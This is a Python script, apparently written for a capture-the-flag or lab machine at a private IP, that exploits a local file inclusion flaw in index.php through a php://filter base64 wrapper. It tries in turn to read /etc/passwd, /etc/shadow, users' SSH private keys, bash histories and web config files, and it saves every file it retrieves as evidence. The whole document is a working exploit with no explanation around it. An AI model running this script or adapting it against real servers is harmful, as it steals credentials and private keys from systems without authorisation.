#!/usr/bin/env python3
import requests
import base64
import sys
import os

def print_colored(text, color="white"):
    colors = {'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
              'blue': '\033[94m', 'cyan': '\033[96m', 'magenta': '\033[95m', 'white': '\033[97m'}
    print(f"{colors.get(color, '')}{text}\033[0m")

def fetch_file_lfi(target_ip, file_path):
    url = f"http://{target_ip}/index.php?page=php://filter/convert.base64-encode/resource={file_path}"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            return base64.b64decode(r.text).decode('utf-8', errors='replace')
    except: pass
    return None

def main():
    target_ip = "10.67.174.191"
    print_colored("[*] LFI Enumerator - Target: {}".format(target_ip), "green")
    print()

    files_to_try = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/home/blue/.reminder", "/home/blue/.bash_history", "/home/blue/.bashrc",
        "/home/blue/.ssh/id_rsa", "/home/blue/.ssh/authorized_keys",
        "/home/red/.bash_history", "/home/red/.bashrc",
        "/home/red/.ssh/id_rsa", "/home/red/.ssh/authorized_keys",
        "/home/red/.git/config",
        "/var/www/html/config.php", "/var/www/html/index.php",
    ]

    interesting_files = []
    for file_path in files_to_try:
        print_colored("[*] Trying: {}".format(file_path), "yellow")
        content = fetch_file_lfi(target_ip, file_path)
        if content:
            print_colored("[+] SUCCESS: {}".format(file_path), "green")
            print_colored(content[:500], "cyan")
            print()
            interesting_files.append((file_path, content))
        else:
            print_colored("[-] Failed", "red")

    if interesting_files:
        out = "evidence/lfi_findings"
        os.makedirs(out, exist_ok=True)
        for fp, c in interesting_files:
            safe = fp.replace("/", "_").replace(".", "_")
            with open(os.path.join(out, safe), 'w') as f:
                f.write("# File: {}\n# Target: {}\n\n".format(fp, target_ip) + c)
            print_colored("[+] Saved: {}".format(safe), "green")

    print_colored("\n[*] Done - {} files retrieved".format(len(interesting_files)), "blue")

if __name__ == "__main__":
    main()
